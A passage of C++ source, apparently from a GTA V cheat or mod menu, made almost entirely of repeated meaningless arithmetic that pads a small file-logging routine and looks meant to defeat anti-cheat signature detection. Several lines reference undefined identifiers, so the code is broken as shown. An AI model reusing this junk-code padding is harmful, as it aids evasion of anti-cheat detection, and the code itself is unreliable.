			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			ofstream Arquivo;
			Arquivo.open(arquivoTXT, std::ios_base::app);
			std::string a = HoraAtual() + texto;
			Arquivo << a << endl;
			Arquivo.close();
		}
		void LogSemHora(string texto)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
